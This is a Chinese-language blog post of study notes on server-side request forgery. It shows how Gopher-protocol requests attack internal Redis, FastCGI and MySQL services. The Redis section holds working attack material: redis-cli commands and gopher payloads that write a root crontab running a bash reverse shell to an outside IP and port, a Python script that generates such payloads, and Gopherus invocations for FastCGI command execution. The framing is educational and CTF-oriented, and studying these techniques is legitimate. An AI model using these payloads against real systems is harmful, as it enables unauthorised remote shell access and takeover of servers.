<p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p>
<p>绝对路径写WebShell<br>常见redis命令的exp：（反弹shell）</p>
<p><strong>这个只能在Centos上使用，别的不行，好像是由于权限的问题</strong></p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> flushall  <span class="hljs-comment">//清空指定host的整个Redis服务器的数据</span><br>echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>*/1 * * * * bash -i &gt;&amp; /dev/tcp/42.xx.xx.xxx/2333 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><span class="hljs-operator">|</span>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> <span class="hljs-operator">-</span>x <span class="hljs-keyword">set</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//redis写定时任务获取root权限和反弹ｓｈｅｌｌ</span><br>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>cron<span class="hljs-operator">/</span><br>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> config <span class="hljs-keyword">set</span> dbfilename root<br>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> save<br></code></pre></td></tr></table></figure>

<p>　<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-crontab.html">ｃｒｏｎｔａｂ命令</a></p>
<p>这个文件中是通过 5 个＊确定命令或任务的执行时间的，这 5 个*的具体含义如表所示。</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>含义</th>
<th>范围</th>
</tr>
</thead>
<tbody><tr>
<td>第一个”*”</td>
<td>一小时当中的第几分钟（minute）</td>
<td>0~59</td>
</tr>
<tr>
<td>第二个”*”</td>
<td>一天当中的第几小时（hour）</td>
<td>0~23</td>
</tr>
<tr>
<td>第三个”*”</td>
<td>一个月当中的第几天（day）</td>
<td>1~31</td>
</tr>
<tr>
<td>第四个”*”</td>
<td>一年当中的第几个月（month）</td>
<td>1~12</td>
</tr>
<tr>
<td>第五个”*”</td>
<td>一周当中的星期几（week）</td>
<td>0~7（0和7都代表星期日）</td>
</tr>
</tbody></table>
<p> <strong>crontab的默认执行路径为：当前用户的根路径</strong></p>
<p>crontab 是用来让使用者在固定时间或固定间隔执行程序</p>
<p>测试用的：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_*<span class="hljs-number">1</span><br><span class="hljs-variable">$8</span><br>flushall<br>*<span class="hljs-number">3</span><br><span class="hljs-variable">$3</span><br>set<br><span class="hljs-variable">$1</span><br><span class="hljs-number">2</span><br><span class="hljs-variable">$64</span><br><br><br><br>*<span class="hljs-regexp">/1 * * * * bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">45952</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br><br><br><br><br>*<span class="hljs-number">4</span><br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br>set<br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$16</span><br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br>*<span class="hljs-number">4</span><br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br>set<br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$4</span><br>root<br>*<span class="hljs-number">1</span><br><span class="hljs-variable">$4</span><br>save<br>quit<br><br></code></pre></td></tr></table></figure>

<p>脚本来改成适配的gopher协议</p>
<p>贴个脚本</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import urllib<br><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;gopher://&quot;</span><br><span class="hljs-attribute">ip</span>=<span class="hljs-string">&quot;ｘｘ.ｘｘｘ.ｘｘ.ｘｘｘ&quot;</span>　　／／ｖｐｓ<br><span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;6379&quot;</span><br><span class="hljs-attribute">reverse_ip</span>=<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span><br><span class="hljs-attribute">reverse_port</span>=<span class="hljs-string">&quot;2333&quot;</span><br><span class="hljs-attribute">cron</span>=<span class="hljs-string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)<br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;/var/spool/cron&quot;</span><br><span class="hljs-attribute">passwd</span>=<span class="hljs-string">&quot;&quot;</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>	 <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.format(cron.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;IFS&#125;</span>&quot;</span>)),<br>	 <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),<br>	 <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),<br>	 <span class="hljs-string">&quot;save&quot;</span><br>	 ]<br><span class="hljs-keyword">if</span> passwd:<br>	cmd.insert(0,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))<br><span class="hljs-attribute">payload</span>=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;<br>def redis_format(arr):<br>	<span class="hljs-attribute">CRLF</span>=<span class="hljs-string">&quot;\r\n&quot;</span><br>	redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>	<span class="hljs-attribute">cmd</span>=<span class="hljs-string">&quot;&quot;</span><br>	cmd+=<span class="hljs-string">&quot;*&quot;</span>+str(len(redis_arr))<br>	<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>		cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+str(len((x.replace(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;IFS&#125;</span>&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;IFS&#125;</span>&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>	cmd+=CRLF<br>	return cmd<br><br><span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&quot;__main__&quot;:<br>	<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>		payload += urllib.quote(redis_format(x))<br>	<span class="hljs-built_in">print</span> payload<br></code></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aflushall%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a2%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">45952</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/var/www/html/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aroot%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">gopher一键生成工具 </a> </p>
<p>该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。</p>
<p>python2 gopherus.py –exploit redis</p>
<p>dｏcker exec -it 4a1597221de8 &#x2F;bin&#x2F;bash</p>
<p>redis-server</p>
<p>redis-cli</p>
<p>KEYS *</p>
<p>GET 2</p>
<p>查看redis确实成功写入了key</p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106532501">GKCTF2020]EZ三剑客-EzWeb］</a>攻击内网Redis例题</p>
<h3 id="攻击内网FastCGI"><a href="#攻击内网FastCGI" class="headerlink" title="攻击内网FastCGI"></a>攻击内网FastCGI</h3><p>FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。</p>
<p>攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对（已经存在的文件），它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p>
<p>而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改PHP的设置。</p>
<p>那么当设置PHP环境变量为：<code>auto_prepend_file = php://input;allow_url_include = On</code>时，就会在执行PHP脚本之前包含环境变量<code>auto_prepend_file</code>所指向的文件内容，<code>php://input</code>也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p>
<p>详情请见：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-58455-1-1.html">《SSRF系列之攻击FastCGI》</a></p>
<blockquote>
<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要<strong>通过浏览器进行解析</strong>，而动态网站需要一个<strong>额外的编译解析</strong>的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>
<p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它<strong>像一个常驻的CGI</strong>，在启动后会一直运行着，不需要每次处理数据时都启动一次，<strong>所以FastCGI的主要行为是将CGI解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p>
</blockquote>
<p>利用条件：</p>
<p>1.主机存在ssrf漏洞</p>
<p>2.WEB服务器上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI（可以利用file:&#x2F;&#x2F;&#x2F;tec&#x2F;passwd 来看有无daemon等文件）</p>
<p>同样可以利用刚刚的gopher工具</p>
<p>使用Gopherus工具生成攻击FastCGI的payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">python2 gopherus.py --exploit fastcgi<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php    <span class="hljs-comment"># 这里输入的是一个已知存在的php文件</span><br>id    <span class="hljs-comment"># 输入一个你要执行的命令</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210114/1610598043_5fffc69b181c82c561065.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="攻击内网MySql"><a href="#攻击内网MySql" class="headerlink" title="攻击内网MySql"></a>攻击内网MySql</h3><p>当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。</p>
<p>与redis的原理也差不多</p>
<p>一样也可以用gopher生成工具</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">python2 gopherus.py <span class="hljs-comment">--exploit mysql</span><br>whoami    <span class="hljs-comment"># 登录用的用户名</span><br>show databases;    <span class="hljs-comment"># 登录后要执行的sql语句</span><br></code></pre></td></tr></table></figure>







<blockquote>
<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57172130/article/details/126169480">https://blog.csdn.net/qq_57172130/article/details/126169480</a></p>
<p><a target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
<p>使用的ssrf-lib环境：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/m6a-UdS/ssrf-lab/">https://github.com/m6a-UdS/ssrf-lab/</a></p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>初识ssrf</div>
      <div>http://shimm3r.github.io/2022/08/13/初识ssrf/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>shimm3r</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 13, 2022</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>Licensed under</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/08/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="命令执行利用总结">
                        <span class="hidden-mobile">命令执行利用总结</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'shimm3r/comment');
      s.setAttribute('issue-term', 'pathname');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
